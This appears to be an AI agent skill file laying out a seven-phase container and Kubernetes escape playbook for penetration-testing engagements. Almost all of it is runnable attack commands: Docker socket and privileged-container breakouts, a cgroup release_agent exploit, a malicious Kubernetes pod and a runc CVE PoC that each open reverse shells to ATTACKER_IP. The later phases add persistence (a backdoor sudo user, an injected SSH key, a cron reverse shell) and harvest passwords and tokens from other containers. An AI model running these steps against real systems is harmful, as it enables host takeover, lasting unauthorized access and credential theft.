---
name: post-container-escape
description: "Container escape and Docker breakout techniques. Privileged containers, Docker socket exploitation, cgroup v1 release agent, nsenter, CVE-based kernel escapes, Kubernetes pod escape. Triggers: 'container escape', 'docker escape', 'privileged container', 'docker socket exploit', 'cgroup escape', 'nsenter', 'kubernetes escape', 'k8s pod escape', 'container breakout', 'docker breakout', 'release_agent cgroup'."
---

# Container Escape & Docker Breakout

Break out of container isolation to access host. Covers privileged containers, Docker socket, cgroup v1, kernel CVEs, K8s pod escape.

---

## Phase 1: Reconnaissance — Am I in a Container?

```bash
# Check if in a container:
cat /proc/1/cgroup | grep -i docker   # docker
ls /.dockerenv 2>/dev/null && echo "in Docker"
cat /proc/self/mountinfo | grep overlay

# Check capabilities (key ones: cap_sys_admin, cap_net_admin, cap_dac_override, cap_setuid):
capsh --print
grep CapEff /proc/self/status | awk '{print $2}' | xargs printf "%d\n" | xargs -I{} python3 -c "
caps=['CAP_CHOWN','CAP_DAC_OVERRIDE','CAP_DAC_READ_SEARCH','CAP_FOWNER','CAP_FSETID',
'CAP_KILL','CAP_SETGID','CAP_SETUID','CAP_SETPCAP','CAP_NET_BIND','CAP_NET_RAW',
'CAP_SYS_CHROOT','CAP_MKNOD','CAP_AUDIT_WRITE','CAP_SETFCAP','CAP_NET_ADMIN',
'CAP_SYS_ADMIN','CAP_SYS_PTRACE']
v={}
for i,c in enumerate(caps):
    if {} & (1<<i): print(f'[+] {c}')
"

# Check seccomp:
grep Seccomp /proc/self/status

# Check AppArmor:
cat /proc/self/attr/current

# Check mounts (look for docker socket, host paths):
mount | grep -E "docker|/host|/proc/host"
ls /var/run/docker.sock 2>/dev/null && echo "[!] Docker socket exposed!"
```

---

## Phase 2: Privileged Container Escape

```bash
# If id shows "uid=0(root)" and capabilities include cap_sys_admin:

# Mount host filesystem:
fdisk -l 2>/dev/null | grep "Linux filesystem"
# Find host partition (e.g. /dev/sda1):
mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Chroot into host:
chroot /mnt/host bash

# OR use nsenter to enter host namespaces:
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Verify host access:
cat /mnt/host/etc/passwd
cat /mnt/host/etc/shadow
# Read SSH keys:
ls /mnt/host/root/.ssh/
cat /mnt/host/root/.ssh/authorized_keys
```

---

## Phase 3: Docker Socket Exploit

```bash
# If /var/run/docker.sock is mounted → full host access

# Verify socket:
ls -la /var/run/docker.sock

# Install docker CLI if missing:
apt-get install -y docker.io 2>/dev/null || \
  curl -fsSL https://download.docker.com/linux/static/stable/x86_64/docker-24.0.7.tgz \
    | tar xz && mv docker/docker /usr/local/bin/

# Method 1: Run privileged container mounting host filesystem:
docker run -it --privileged --pid=host -v /:/host ubuntu:latest \
  chroot /host bash

# Method 2: Direct host filesystem mount:
docker run -it -v /:/mnt/host ubuntu:latest \
  chroot /mnt/host bash

# Method 3: Docker API via curl:
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | jq .
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu","Cmd":["/bin/bash","-c","chroot /mnt bash"],"HostConfig":{"Binds":["/:/mnt"],"Privileged":true}}'
```

---

## Phase 4: Cgroup v1 Release Agent (no docker socket needed)

```bash
# Works on: cgroup v1 + cap_sys_admin or privileged container

# Check cgroup v1:
mount | grep cgroup | grep -v cgroup2

# The attack (executes command on host as root):
# 1. Find writable cgroup:
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || \
  mount -t cgroup cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

# 2. Enable notify_on_release:
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# 3. Write payload (reverse shell):
cat > /cmd << 'EOF'
#!/bin/sh
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /cmd

# 4. Trigger:
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

---

## Phase 5: Kubernetes Pod Escape

```bash
# Check if in K8s:
env | grep -i kubernetes
ls /var/run/secrets/kubernetes.io/serviceaccount/

# Read service account token:
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://kubernetes.default.svc"
CACERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# Enumerate permissions:
curl -s $APISERVER/api --header "Authorization: Bearer $TOKEN" --cacert $CACERT
curl -s $APISERVER/api/v1/namespaces --header "Authorization: Bearer $TOKEN" --cacert $CACERT

# Check if can create pods (escape vector):
curl -s $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  --header "Authorization: Bearer $TOKEN" --cacert $CACERT \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"create","resource":"pods"}}}'

# If can create pods → escape via hostPath mount:
cat << EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: escape
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: escape
    image: ubuntu
    command: ["/bin/bash", "-c", "nsenter --target 1 --mount --uts --ipc --net --pid -- bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"]
    securityContext:
      privileged: true
  restartPolicy: Never
EOF
```

---

## Phase 6: CVE-Based Escapes

```bash
# CVE-2019-5736 (runc overwrite):
# Requires: ability to run containers, runc version < 1.0-rc6
go get github.com/Frichetten/CVE-2019-5736-PoC
cd $GOPATH/src/github.com/Frichetten/CVE-2019-5736-PoC
go build -o runc_escape .
./runc_escape "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"

# CVE-2021-3493 (Ubuntu OverlayFS — in-container privesc to host):
# Affects: Ubuntu kernels before 5.11.0-16
# PoC: https://github.com/briskets/CVE-2021-3493

# Check kernel version:
uname -r

# Dirty COW (CVE-2016-5195) — very old kernels:
# Check: uname -r | awk -F. '{if ($1<4 || ($1==4 && $2<8)) print "vulnerable"}'
```

---

## Phase 7: Post-Escape Persistence

```bash
# After gaining host access — establish persistence:

# Add backdoor user:
useradd -m -p $(openssl passwd -1 'backdoor') -s /bin/bash -G sudo attacker

# SSH key:
mkdir -p /root/.ssh
echo "ssh-rsa ATTACKER_PUBLIC_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Cron reverse shell:
echo "* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /etc/crontab

# Harvest other container creds:
find /var/lib/docker/containers -name "*.log" | xargs grep -i "password\|secret\|api_key" 2>/dev/null
docker ps -q | xargs -I{} docker exec {} env 2>/dev/null | grep -i "pass\|secret\|key\|token"
```

---

## Quick Assessment One-Liner

```bash
# Rapid escape vector check:
echo "=== Capabilities ===" && capsh --print 2>/dev/null | grep Current
echo "=== Docker Socket ===" && ls -la /var/run/docker.sock 2>/dev/null
echo "=== Privileged ===" && cat /proc/self/status | grep CapEff
echo "=== K8s Token ===" && ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
echo "=== cgroup ===" && mount | grep cgroup
```

---

## Output

Save to `.omop/engagement/post-exploit/container-escape/`:
- `recon.txt` — capabilities, mounts, environment
- `escape-vector.txt` — chosen escape method
- `host-access-proof.txt` — `whoami; hostname; uname -a` from host

## Next Phase

→ `ad-attacks` for domain compromise from host
→ `tech-kubernetes` for full K8s cluster compromise
→ `red-persistence` for host persistence
